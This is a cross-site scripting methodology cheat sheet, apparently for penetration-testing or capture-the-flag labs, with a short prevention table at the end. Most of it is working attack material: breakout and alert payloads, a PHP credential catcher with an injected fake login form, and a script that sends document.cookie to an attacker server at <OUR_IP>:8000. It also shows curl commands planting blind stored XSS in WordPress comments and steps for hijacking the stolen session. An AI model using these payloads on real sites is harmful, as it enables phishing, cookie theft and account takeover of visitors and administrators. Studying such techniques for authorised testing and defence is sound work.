# Cross-Site Scripting (XSS) Methodology

## XSS Types

| Type | Where it Lives | Persistent? | How to Exploit |
|------|---------------|-------------|----------------|
| Stored | Back-end database | Yes | Any visitor triggers it; alert fires on page LOAD |
| Reflected | Server response (no storage) | No | Send crafted URL to victim |
| DOM-based | Client-side JS only, never hits server | No | Inject via URL hash/params |

**Source** = where user input enters (URL param, input field, HTTP header)  
**Sink** = where input gets written to DOM (`innerHTML`, `document.write`, jQuery `html()`, etc.)

---

## Phase 1 — Recon

```bash
# Find all input fields
curl -s http://<TARGET>/ | grep -i "input\|textarea\|form\|name="

# Find the page source for JS files that may have sinks
curl -s http://<TARGET>/script.js | grep -i "innerHTML\|document.write\|\.html("

# For WordPress/CMS — find post URLs with comment forms
curl -s http://<TARGET>/ | grep -i "href.*post\|href.*20[0-9][0-9]"
```

Note all form action URLs, methods (GET/POST), and hidden fields (like `comment_post_ID`) — missing hidden fields causes silent submission failure.

---

## Phase 2 — Identify XSS Type & Context

### Step 1: Probe for reflection
```bash
curl -s "http://<TARGET>/page?param=PROBE" | grep "PROBE"
```

**Critical pitfall:** Probe with input that triggers the error/validation-fail path, not just any value.  
Example: if a field only reflects on validation failure, `param=PROBE` (invalid format) reflects but `param=valid@email.com` does not. Always test with both valid and invalid format inputs.

- PROBE in response → **Reflected XSS**
- PROBE not in response, but JS reads URL params → **DOM XSS**
- Form says "admin will review" / no output shown → **Blind XSS (Stored)**

### Step 2: Identify HTML context and breakout
```bash
curl -s "http://<TARGET>/page?param=PROBE" | grep -A2 -B2 "PROBE"
```

| HTML context | Breakout needed |
|-------------|----------------|
| `<tag>INPUT</tag>` | None — `<script>alert(1)</script>` works directly |
| `<img src='INPUT'>` | `'><script>alert(1)</script>` |
| `<img src="INPUT">` | `"><script>alert(1)</script>` |
| `<a href="INPUT">` | `"><script>alert(1)</script>` |
| innerHTML/jQuery `.html()` | `<img src=x onerror=alert(1)>` — script tags blocked by innerHTML |

### Step 3: Automated scan
```bash
python xsstrike.py -u "http://<TARGET>/page?param=test"
# XSStrike tests all params; look for "Reflections found"
```

---

## Phase 3 — Basic Exploitation (Confirm XSS Works)

### Alert payloads (in order of preference)
```html
<script>alert(window.origin)</script>       <!-- shows which domain is vulnerable -->
<script>alert(document.cookie)</script>     <!-- shows cookie directly -->
<img src='' onerror=alert(document.cookie)> <!-- use when innerHTML blocks script tags -->
<script>print()</script>                    <!-- rarely blocked, triggers print dialog -->
<plaintext>                                 <!-- stops HTML rendering, shows raw source -->
```

**Stored XSS:** Submit the payload, then **refresh the page** — alert fires on load, not on submission.  
**Reflected XSS:** Paste the full URL with payload into browser address bar.  
**DOM XSS:** Use `#` fragment — `http://<TARGET>/#param=<img src='' onerror=alert(document.cookie)>`

---

## Phase 4 — Phishing Attack

### Setup: credential catcher (different from cookie catcher)
```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://<TARGET>/original-page.php");
    fclose($file);
    exit();
}
?>
```

### Inject fake login form
```javascript
document.write('<h3>Please login to continue</h3><form action=http://<OUR_IP>:<PORT>><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
document.getElementById('<FORM_ID>').remove();
```

- Find form ID with `CTRL+SHIFT+C` (page inspector) → click the form element
- Append `<!--` at end of payload to comment out remaining page HTML
- Start server: `cd /tmp/tmpserver && sudo php -S 0.0.0.0:8000`
- Read creds: `cat /tmp/tmpserver/creds.txt`

---

## Phase 5 — Session Hijacking (Blind XSS)

### Setup files
```bash
mkdir /tmp/tmpserver && cd /tmp/tmpserver
```

**index.php** (cookie catcher):
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

**script.js** (cookie stealer):
```bash
echo "new Image().src='http://<OUR_IP>:8000/index.php?c='+document.cookie;" > script.js
```

Start server (port 80 is usually occupied):
```bash
sudo php -S 0.0.0.0:8000
```

Verify connectivity:
```bash
curl http://<OUR_IP>:8000/test   # check PHP terminal — should show GET /test
```

### Step 1: Detect which field is vulnerable
Submit one registration/comment with a different field name in each URL path. Keep required fields (name, email) clean — CMS validation rejects XSS in them.

```bash
# Example for a comment form — mix --data-urlencode (for XSS fields) and -d (for clean fields)
curl -s -X POST "http://<TARGET>/wp-comments-post.php" \
  --data-urlencode "comment=<script src=http://<OUR_IP>:8000/comment></script>" \
  --data-urlencode "author=John Smith" \
  --data-urlencode "email=john@test.com" \
  --data-urlencode 'url="><script src=http://<OUR_IP>:8000/url></script>' \
  -d "comment_post_ID=<POST_ID>&comment_parent=0&submit=Post+Comment"
```

Watch PHP terminal — whichever field name hits the server (GET /comment or GET /url) is the vulnerable field. The breakout variant that worked is also revealed (no breakout, `'>`, or `">`).

**Plain URL fetch ≠ script execution.** If a plain URL like `http://<OUR_IP>:8000/fieldname` triggers a GET request, the value is being used as a resource URL (img src, link href) — it's fetched but NOT executed as JS. You still need the `"><script>` breakout to get execution.

### Step 2: Deliver cookie-stealing payload using confirmed breakout
```bash
curl -s -X POST "http://<TARGET>/wp-comments-post.php" \
  --data-urlencode "author=John Smith" \
  --data-urlencode "email=john2@test.com" \
  --data-urlencode 'url="><script src=http://<OUR_IP>:8000/script.js></script>' \
  -d "comment_post_ID=<POST_ID>&comment_parent=0&submit=Post+Comment"
```

Wait 30-60 seconds for admin to review. PHP terminal should show:
```
GET /script.js       ← script fetched and executing
GET /index.php?c=... ← cookie sent back
```

If `script.js` is fetched but no `index.php?c=` follows → try `document.location` instead of `new Image()`:
```bash
echo "document.location='http://<OUR_IP>:8000/index.php?c='+document.cookie;" > script.js
```

### Step 3: Read stolen cookie
```bash
cat /tmp/tmpserver/cookies.txt
```

---

## Phase 6 — Use Stolen Cookie

Browser → navigate to target login page → `Shift+F9` (Storage) → `+` → add cookie:
- **Name:** part before `=` in stolen cookie
- **Value:** part after `=`

Refresh → access victim session. Note: multiple cookies may be stolen (session + flag + tracking); the flag is often in a cookie named `flag`.

---

## Prevention Reference (for reporting)

| Layer | Technique |
|-------|-----------|
| Front-end input validation | Regex checks, reject non-conforming formats |
| Front-end sanitization | DOMPurify library: `let clean = DOMPurify.sanitize(dirty)` |
| Back-end sanitization | PHP: `addslashes()`, `htmlspecialchars()`, `htmlentities()` |
| Back-end encoding | Encode output: `htmlentities($_GET['param'])` |
| Avoid dangerous sinks | Never use `innerHTML`, `document.write()`, jQuery `html()` with raw user input |
| Cookie protection | `HttpOnly` flag (blocks JS access), `Secure` flag (HTTPS only) |
| CSP header | `Content-Security-Policy: script-src 'self'` blocks external scripts |
| WAF | Detects and blocks XSS payloads in HTTP requests |

---

## curl POST Reference

```bash
# --data-urlencode: URL-encodes the value — use for fields with special chars (<, >, ", ')
--data-urlencode "field=<script>alert(1)</script>"

# -d: raw data — use for clean fields and hidden fields
-d "comment_post_ID=8&submit=Post+Comment"

# Mix both in one curl command — works fine
curl -X POST <URL> --data-urlencode "xss_field=PAYLOAD" -d "clean_field=value"
```
